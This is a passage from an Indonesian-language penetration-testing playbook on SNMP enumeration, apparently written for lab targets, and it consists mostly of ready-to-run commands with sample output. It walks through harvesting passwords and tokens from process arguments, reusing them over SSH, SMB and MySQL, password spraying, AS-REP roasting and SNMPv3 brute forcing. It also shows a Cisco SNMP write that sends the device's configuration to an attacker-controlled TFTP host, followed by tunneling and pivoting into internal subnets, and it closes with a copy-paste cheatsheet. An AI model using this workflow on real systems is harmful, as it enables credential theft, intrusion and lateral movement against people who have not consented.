[ -n "$HOSTNAME" ] && echo "$TARGET $HOSTNAME" | sudo tee -a /etc/hosts

# Cari exploit berdasarkan OS
KERNEL=$(echo "$OS_INFO" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
echo "[*] Searching exploits for kernel: $KERNEL"
searchsploit "linux kernel $KERNEL" 2>/dev/null | head -20
```

---

### Langkah 3.3 — Process List & Password Leak (PRIORITAS UTAMA!)

Bash

```
# OID: hrSWRunParameters - Argumen command-line proses (sering bocorkan password!)
echo "=== PROCESS ARGUMENTS (PASSWORD HUNTING) ==="
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.4.2.1.5 \
    | tee ~/snmp_loot/dump/process_args.txt

# Langsung filter yang mengandung credentials
grep -iE "pass|pwd|secret|token|key|user|admin|login|cred" ~/snmp_loot/dump/process_args.txt \
    | tee ~/snmp_loot/creds/process_creds.txt

# Process names (untuk identifikasi service)
echo "=== RUNNING PROCESSES ==="
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.4.2.1.2 \
    | awk -F'STRING: ' '{print $2}' | tr -d '"' | sort -u \
    | tee ~/snmp_loot/dump/running_processes.txt
```

**OUTPUT BERHASIL ✅ — Password bocor di command-line:**

text

```
HOST-RESOURCES-MIB::hrSWRunParameters.892  = STRING: "/usr/sbin/sshd -D"
HOST-RESOURCES-MIB::hrSWRunParameters.1240 = STRING: "/usr/bin/python3 /opt/sync.py --user james --password P@ssw0rdSecure2024!"
HOST-RESOURCES-MIB::hrSWRunParameters.1340 = STRING: "mysql -u root -pR00tPa55w0rd! -h 127.0.0.1"
HOST-RESOURCES-MIB::hrSWRunParameters.1890 = STRING: "/opt/backup.sh --token=ghp_98a7sd98f7a"
```

➡️ **MULTIPLE CREDENTIALS BOCOR!** Simpan dan test semua:

Bash

```
# Simpan credentials
cat >> ~/snmp_loot/creds/found_creds.txt << 'EOF'
james:P@ssw0rdSecure2024!
root:R00tPa55w0rd! (MySQL)
github_token:ghp_98a7sd98f7a
EOF

# Test credentials ke semua service yang aktif
nxc ssh $TARGET -u james -p "P@ssw0rdSecure2024!"        # → SSH
nxc smb $TARGET -u james -p "P@ssw0rdSecure2024!"        # → SMB
nxc mysql $TARGET -u root -p "R00tPa55w0rd!"              # → MySQL
```

**OUTPUT GAGAL ❌ — Tidak ada process args bocorkan password:**

text

```
HOST-RESOURCES-MIB::hrSWRunParameters.1 = STRING: ""
HOST-RESOURCES-MIB::hrSWRunParameters.2 = STRING: ""
```

➡️ Process berjalan tanpa argumen sensitif. Lanjut ke OID lain.

---

### Langkah 3.4 — Network Interfaces (Pivot Discovery!)

Bash

```
# Cek semua interface dan IP yang terpasang
echo "=== NETWORK INTERFACES ==="
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.2.2.1.2  # Interface names
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.4.20.1.1 \
    | tee ~/snmp_loot/network/ip_addresses.txt             # All IP addresses

# Routing table (untuk menemukan jaringan yang bisa dijangkau)
echo "=== ROUTING TABLE ==="
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.4.21.1.1 \
    | tee ~/snmp_loot/network/routing_table.txt
```

**OUTPUT BERHASIL ✅ — Dual-NIC ditemukan:**

text

```
IP-MIB::ipAdEntAddr.10.10.11.200   = IpAddress: 10.10.11.200
IP-MIB::ipAdEntAddr.172.16.10.1    = IpAddress: 172.16.10.1    ← INTERNAL SUBNET!
IP-MIB::ipAdEntAddr.192.168.100.1  = IpAddress: 192.168.100.1  ← ANOTHER NETWORK!
```

➡️ **PIVOT OPPORTUNITY!** Target punya multiple network interface:

Bash

```
# Simpan internal subnets untuk pivot nanti
echo "172.16.10.0/24" >> ~/snmp_loot/network/internal_subnets.txt
echo "192.168.100.0/24" >> ~/snmp_loot/network/internal_subnets.txt

echo "[!] PIVOT TARGET FOUND!"
echo "[*] Setelah dapat shell, setup SSH SOCKS5 proxy:"
echo "ssh -D 1080 -N user@$TARGET"
echo "[*] Kemudian scan subnet internal:"
echo "proxychains nmap -sT 172.16.10.0/24"
echo "[*] → Lanjut ke <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>"
```

---

### Langkah 3.5 — Hidden Local Ports (Service Discovery!)

Bash

```
# TCP ports yang sedang listening (termasuk localhost-only services!)
echo "=== LOCAL TCP PORTS ==="
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.6.13.1.3 \
    | sort -u \
    | tee ~/snmp_loot/network/tcp_ports.txt

# UDP ports
echo "=== LOCAL UDP PORTS ==="
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.7.5.1.2 \
    | sort -u \
    | tee ~/snmp_loot/network/udp_ports.txt
```

**OUTPUT BERHASIL ✅ — Hidden ports ditemukan:**

text

```
TCP-MIB::tcpConnLocalPort.0.0.0.0.22    = INTEGER: 22      (SSH - publik)
TCP-MIB::tcpConnLocalPort.0.0.0.0.80    = INTEGER: 80      (HTTP - publik)
TCP-MIB::tcpConnLocalPort.127.0.0.1.3306 = INTEGER: 3306   ← MySQL di localhost!
TCP-MIB::tcpConnLocalPort.127.0.0.1.8080 = INTEGER: 8080   ← Web app di localhost!
TCP-MIB::tcpConnLocalPort.127.0.0.1.6379 = INTEGER: 6379   ← Redis di localhost!
```

➡️ **Hidden services ditemukan!** Setelah dapat SSH shell, forward port ini:

Bash

```
# Simpan hidden ports untuk akses via SSH tunnel nanti
echo "MySQL:3306 (localhost)" >> ~/snmp_loot/network/hidden_ports.txt
echo "WebApp:8080 (localhost)" >> ~/snmp_loot/network/hidden_ports.txt
echo "Redis:6379 (localhost)" >> ~/snmp_loot/network/hidden_ports.txt

echo "[*] Setelah dapat SSH:"
echo "ssh -L 3306:127.0.0.1:3306 user@$TARGET  # Forward MySQL"
echo "ssh -L 8080:127.0.0.1:8080 user@$TARGET  # Forward WebApp"
echo "ssh -L 6379:127.0.0.1:6379 user@$TARGET  # Forward Redis"
```

---

### Langkah 3.6 — Windows User Accounts (Jika Target Windows)

Bash

```
# OID: svUserName - Daftar user accounts Windows
echo "=== WINDOWS USER ACCOUNTS ==="
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.25 \
    | tee ~/snmp_loot/users/raw_users.txt

# Ekstrak username bersih
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.25 \
    | awk -F': ' '{print $2}' \
    | tr -d '"' \
    | sort -u \
    | grep -v "^$" \
    | tee ~/snmp_loot/users/windows_users.txt

echo "[*] Total users: $(wc -l < ~/snmp_loot/users/windows_users.txt)"
cat ~/snmp_loot/users/windows_users.txt
```

**OUTPUT BERHASIL ✅ — Windows users ditemukan:**

text

```
administrator
svc-backup
r.thompson
s.clark
jordan
james

[*] Total users: 6
```

➡️ Gunakan untuk password spraying:

Bash

```
# Password spray ke SMB
nxc smb $TARGET -u ~/snmp_loot/users/windows_users.txt \
    -p 'Welcome2024!' --continue-on-success \
    | tee ~/snmp_loot/creds/spray_results.txt

# Jika environment AD, coba AS-REP Roasting
impacket-GetNPUsers "DOMAIN.LOCAL/" \
    -usersfile ~/snmp_loot/users/windows_users.txt \
    -format hashcat \
    -no-pass \
    -dc-ip $TARGET \
    -outputfile ~/snmp_loot/creds/asrep_hashes.txt
# → Ke <a href="/docs/kerberoasting-asreproasting" class="text-[#00b4d8] hover:underline font-mono font-semibold">37_kerberoasting_asreproasting_workflow.md</a>
```

**OUTPUT GAGAL ❌ — OID tidak supported (target Linux):**

text

```
iso.3.6.1.4.1.77.1.2.25.1.1 = No Such Object available on this agent at this OID
```

➡️ Target adalah Linux, bukan Windows. OID user Windows tidak tersedia. Gunakan proses list untuk username:

Bash

```
# Cari username di process list
grep -iE "user|uid|home" ~/snmp_loot/dump/full_mib_dump.txt | head -20

# Cari di storage descriptions
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.2.3.1.3 \
    | grep "/home/" | awk -F'STRING: ' '{print $2}' | tr -d '"'
```

---

### Langkah 3.7 — Installed Software (CVE Research)

Bash

```
# Daftar software terinstall (Windows & Linux)
echo "=== INSTALLED SOFTWARE ==="
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.6.3.1.2 \
    | awk -F'STRING: ' '{print $2}' \
    | tr -d '"' \
    | sort -u \
    | tee ~/snmp_loot/dump/installed_software.txt

echo "[*] Total software: $(wc -l < ~/snmp_loot/dump/installed_software.txt)"
head -20 ~/snmp_loot/dump/installed_software.txt
```

**OUTPUT BERHASIL ✅ — Software list dengan versi:**

text

```
Apache 2.4.41
FileZilla Server 0.9.41
OpenSSH for Windows 7.7p1
MySQL 5.7.34
PHP 7.4.3
```

➡️ Cari CVE untuk setiap software:

Bash

```
# Automated CVE search untuk semua software
while read software; do
    echo "=== $software ==="
    searchsploit "$software" 2>/dev/null | head -3
done < ~/snmp_loot/dump/installed_software.txt

# Manual untuk software spesifik yang menarik
searchsploit "Apache 2.4.41"
searchsploit "FileZilla Server 0.9"
# Google: "Apache 2.4.41 CVE exploit"
```

---

## ═══════════════════════════════════════

## FASE 4: SNMP v3 TESTING (Jika v1/v2c Gagal)

## ═══════════════════════════════════════

> **Tujuan:** Jika semua community string v1/v2c gagal, server mungkin pakai SNMP v3.

### Langkah 4.1 — Deteksi & Test SNMP v3

Bash

```
# Deteksi SNMP v3 Engine
sudo nmap -sU -p 161 --script snmp-info $TARGET
```

**OUTPUT BERHASIL ✅ — SNMP v3 terdeteksi:**

text

```
| snmp-info:
|   enterprise: net-snmp
|   engineBoots: 5
|   snmpEngineTime: 2d, 14h, 23m, 12s
|_  engineID: 0x80004fb805636c6f7564
```

➡️ Engine ID ditemukan! Coba bruteforce credentials v3:

Bash

```
# Cari credentials v3 dari tempat yang mungkin:
# 1. File konfigurasi SNMP (jika sudah punya shell)
# cat /etc/snmp/snmpd.conf | grep -E "user|auth|priv"
# 2. Backup files dari FTP/SMB yang sudah diloot sebelumnya
# 3. Default credentials

# Test dengan credentials default v3
for user in admin snmp monitor netman; do
    for authpass in "AuthPass123" "admin123" "public" "private"; do
        result=$(snmpwalk -v3 -l authNoPriv -u "$user" -a MD5 -A "$authpass" \
            -t 1 -r 0 $TARGET 1.3.6.1.2.1.1.5.0 2>/dev/null)
        if [ -n "$result" ]; then
            echo "[+] SNMP v3 VALID: user=$user, authpass=$authpass"
            echo "user=$user authpass=$authpass" >> ~/snmp_loot/creds/snmpv3_creds.txt
        fi
    done
done

# Jika dapat credentials v3 dari config file:
snmpwalk -v3 -l authPriv \
    -u snmpuser \
    -a SHA -A "AuthPass123" \
    -x AES -X "PrivPass123" \
    $TARGET \
    | tee ~/snmp_loot/dump/snmpv3_dump.txt
```

**OUTPUT GAGAL ❌ — Semua v3 credentials gagal:**

text

```
Error in packet. Reason: unknownUserName
```

➡️ Tidak bisa access SNMP v3 tanpa credentials yang valid. Cari credentials dari:

Bash

```
# 1. Cek konfigurasi yang sudah diloot dari service lain (FTP, SMB, NFS)
grep -ri "snmp" ~/ftp_loot/ ~/smb_loot/ ~/nfs_loot/ 2>/dev/null
grep -ri "community" ~/ftp_loot/ ~/smb_loot/ ~/nfs_loot/ 2>/dev/null

# Google: "snmpd.conf default credentials site:github.com"
# Google: "SNMP v3 default username password list"
```

---

## ═══════════════════════════════════════

## FASE 5: SNMP WRITE ACCESS TESTING

## ═══════════════════════════════════════

> **Tujuan:** Jika `private` atau `manager` community string ditemukan, test write access.

### Langkah 5.1 — Test dan Exploit Write Access

Bash

```
# Test apakah write access tersedia
# Coba ubah sysContact sebagai test
snmpset -v2c -c private $TARGET \
    1.3.6.1.2.1.1.4.0 \
    s "Pentest-Test-$(date +%s)"

# Verifikasi apakah berubah
snmpget -v2c -c public $TARGET 1.3.6.1.2.1.1.4.0
```

**OUTPUT BERHASIL ✅ — Write access terkonfirmasi:**

text

```
SNMPv2-MIB::sysContact.0 = STRING: "Pentest-Test-1704067200"
```

➡️ SNMP write access aktif! Ini berbahaya dan bisa diexploit:

Bash

```
# Untuk router/switch Cisco - bisa download running-config via TFTP
# Setup TFTP server di attacker
sudo apt install tftpd-hpa -y
sudo systemctl start tftpd-hpa

# Trigger Cisco download config ke TFTP kita
snmpset -v2c -c private $TARGET \
    1.3.6.1.4.1.9.2.1.55.0 s "$LHOST"    # TFTP server IP
snmpset -v2c -c private $TARGET \
    1.3.6.1.4.1.9.2.1.56.0 s "running-config"  # filename

# Monitor TFTP untuk file yang masuk
ls -la /srv/tftp/ 2>/dev/null || ls -la /var/lib/tftpboot/ 2>/dev/null
```

**OUTPUT GAGAL ❌ — Write access denied:**

text

```
Error in packet. Reason: notWritable
```

➡️ Community string yang ditemukan hanya read-only. Lanjut ke Fase 6.

---

## ═══════════════════════════════════════

## FASE 6: CROSS-SERVICE PIVOT

## ═══════════════════════════════════════

### Langkah 6.1 — Konsolidasi Temuan dan Test ke Service Lain

Bash

```
# Summary semua yang ditemukan dari SNMP
echo "========================================="
echo "SNMP ENUMERATION SUMMARY"
echo "========================================="
echo "[*] Credentials found:"
cat ~/snmp_loot/creds/found_creds.txt 2>/dev/null || echo "  None"
echo "[*] Windows users:"
cat ~/snmp_loot/users/windows_users.txt 2>/dev/null || echo "  None"
echo "[*] Hidden ports:"
cat ~/snmp_loot/network/hidden_ports.txt 2>/dev/null || echo "  None"
echo "[*] Internal subnets:"
cat ~/snmp_loot/network/internal_subnets.txt 2>/dev/null || echo "  None"
echo "========================================="
```

Bash

```
# Test semua credentials yang ditemukan ke semua service
while IFS=: read user pass; do
    pass=$(echo "$pass" | cut -d' ' -f1)  # Remove comments
    echo "=== Testing $user:$pass ==="
    nxc ssh $TARGET -u "$user" -p "$pass" 2>/dev/null | grep "\[+\]"
    nxc smb $TARGET -u "$user" -p "$pass" 2>/dev/null | grep "\[+\]"
    nxc winrm $TARGET -u "$user" -p "$pass" 2>/dev/null | grep "\[+\]"
done < ~/snmp_loot/creds/found_creds.txt
```

**OUTPUT BERHASIL ✅ — SSH berhasil:**

text

```
SSH  10.10.11.200  22  [+] james:P@ssw0rdSecure2024!
```

➡️ Masuk SSH dan akses hidden ports:

Bash

```
# Login SSH
ssh james@$TARGET

# Di dalam SSH, port forward hidden services
ssh -L 3306:127.0.0.1:3306 james@$TARGET  # MySQL
ssh -L 8080:127.0.0.1:8080 james@$TARGET  # Web
ssh -L 6379:127.0.0.1:6379 james@$TARGET  # Redis

# Kemudian akses dari attacker
mysql -u root -p"R00tPa55w0rd!" -h 127.0.0.1 -P 3306
curl http://127.0.0.1:8080/
redis-cli -h 127.0.0.1 -p 6379

# Pivot ke internal subnet (jika Dual-NIC ditemukan)
ssh -D 1080 -N james@$TARGET &  # SOCKS5 proxy
proxychains nmap -sT 172.16.10.0/24  # Scan subnet internal
# → Ke <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`open\|filtered` pada port 161|UDP tidak responsive ke nmap|Coba onesixtyone langsung, lebih reliable|
|Semua community string gagal|SNMP v3 atau string non-standard|`nmap -sU -p 161 --script snmp-info` untuk cek v3|
|`Timeout: No Response`|Latency VPN tinggi atau community salah|Tambahkan `-t 5 -r 3` ke snmpwalk|
|Output `Hex-STRING`|Data biner/enkripsi|`echo "HEX" \| xxd -r -p` untuk decode|
|`No Such Object at this OID`|OID tidak cocok dengan OS target|Gunakan OID yang sesuai platform (cek cheat sheet)|
|snmpwalk sangat lambat|v1/v2c query satu per satu|Ganti ke `snmpbulkwalk -Cn0 -Cr20`|
|Community valid tapi output sedikit|Restricted MIB View|Coba community string lain yang lebih privileged|
|Windows tidak tampilkan user accounts|Host Resources MIB tidak diinstall|Cek proses di `1.3.6.1.2.1.25.4.2.1.2`|
|Port 161 tidak terdeteksi nmap TCP scan|SNMP adalah UDP!|Selalu pakai `sudo nmap -sU -p 161`|
|Rate limiting|SNMP daemon throttling|Tambahkan `-w 100` ke onesixtyone|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: UDP Port 161 Scan (sudo nmap -sU!)
│
├─ FASE 0: Port Detection
│   ├─ [open] → Lanjut
│   ├─ [open|filtered] → Coba onesixtyone langsung
│   └─ [filtered/closed] → SNMP tidak ada, skip
│
├─ FASE 1: Community String Brute Force
│   ├─ [public/private berhasil] → FASE 2
│   ├─ [custom string berhasil] → FASE 2
│   └─ [semua gagal] → FASE 4 (SNMP v3)
│
├─ FASE 2: Quick Automated Scan
│   ├─ snmp-check → human-readable report
│   ├─ [Password bocor!] → Test ke SSH/SMB langsung!
│   ├─ [Dual-NIC!] → Catat untuk pivot
│   └─ Lanjut ke FASE 3
│
├─ FASE 3: Deep MIB Enumeration
│   ├─ Process args → [Password leak] → test credentials
│   ├─ Network interfaces → [Internal subnet] → pivot planning
│   ├─ TCP ports → [Hidden services] → SSH tunnel
│   ├─ Windows users → [User list] → password spray
│   └─ Installed software → [Versions] → searchsploit CVE
│
├─ FASE 4: SNMP v3 (jika v1/v2c gagal semua)
│   └─ [Creds dari config file] → snmpwalk -v3
│
├─ FASE 5: Write Access (jika private/manager ditemukan)
│   └─ [Write confirmed] → Modify config / Cisco TFTP dump
│
└─ FASE 6: Cross-Service Pivot
    ├─ Credentials → SSH/SMB/WinRM/MySQL
    ├─ Hidden ports → SSH tunnel
    └─ Internal subnet → SOCKS5 proxy pivoting
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export COMMUNITY="public"; export LHOST="10.10.14.5"
mkdir -p ~/snmp_loot/{dump,creds,users,network}

# === DETECTION ===
sudo nmap -sU -p 161 -Pn $TARGET                          # Basic UDP scan
sudo nmap -sU -p 161 --script snmp-info -Pn $TARGET       # With probe

# === COMMUNITY BRUTE FORCE ===
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET
# Manual test:
for c in public private manager admin; do snmpget -v2c -c $c -t 1 $TARGET 1.3.6.1.2.1.1.5.0 2>/dev/null && echo "VALID: $c"; done

# === AUTOMATED SCAN ===
snmp-check -t $TARGET -c $COMMUNITY                        # Human-readable report
snmpwalk -v2c -c $COMMUNITY $TARGET > ~/snmp_loot/dump/full_mib_dump.txt  # Full dump
snmpbulkwalk -v2c -c $COMMUNITY -Cn0 -Cr10 -t 3 $TARGET > ~/snmp_loot/dump/bulk.txt  # Fast

# === HIGH-VALUE TARGETED QUERIES ===
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.1          # System info
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.4.2.1.5 # Process args (PASSWORD LEAK!)
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.4.20.1.1   # IP addresses (Dual-NIC!)
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.6.13.1.3   # TCP ports (Hidden services!)
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.25  # Windows users
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.6.3.1.2 # Installed software

# === CREDENTIAL HUNTING FROM DUMP ===
grep -iE "pass|pwd|secret|token|key" ~/snmp_loot/dump/full_mib_dump.txt
grep "STRING:" ~/snmp_loot/dump/full_mib_dump.txt | awk -F'STRING: ' '{print $2}' | sort -u

# === WINDOWS USER EXTRACTION ===
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.25 \
    | awk -F': ' '{print $2}' | tr -d '"' | sort -u > ~/snmp_loot/users/windows_users.txt
nxc smb $TARGET -u ~/snmp_loot/users/windows_users.txt -p 'Welcome2024!' --continue-on-success

# === HEX DECODE ===
echo "41 64 6D 69 6E" | xxd -r -p                          # Decode Hex-STRING
```

---

## Cross-Service Chart dari SNMP

text

```
SNMP Findings
     │
     ├── Credentials in process args
     │   ├─ ─ SSH creds → Port 22    → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     │   ├─ ─ SMB creds → Port 445   → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
     │   ├─ ─ DB creds  → Port 3306  → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
     │   └── API token → GitHub/API → Direct access
     │
     ├── Windows user list
     │   ├─ ─ Password spray → SMB   → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
     │   └─ ─ AS-REP Roast  → AD    → <a href="/docs/kerberoasting-asreproasting" class="text-[#00b4d8] hover:underline font-mono font-semibold">37_kerberoasting_workflow.md</a>
     │
     ├── Hidden localhost ports
     │   └── SSH tunnel → Access hidden services
     │
     ├── Dual-NIC / Internal subnet
     │   └─ ─ Pivot via SOCKS5      → <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
     │
     └── Installed software versions
         └── searchsploit CVE      → Exploit direct
```

---

> **➡️ NEXT:** Setelah SNMP selesai dan punya daftar user Windows/Linux, lanjut ke **`[11_ldap_workflow.md — Pentest Workflow: LDAP & Active Directory Enumeration](/docs/ldap)`** untuk Anonymous Bind LDAP dan dump seluruh struktur Active Directory termasuk SPN accounts untuk Kerberoasting.
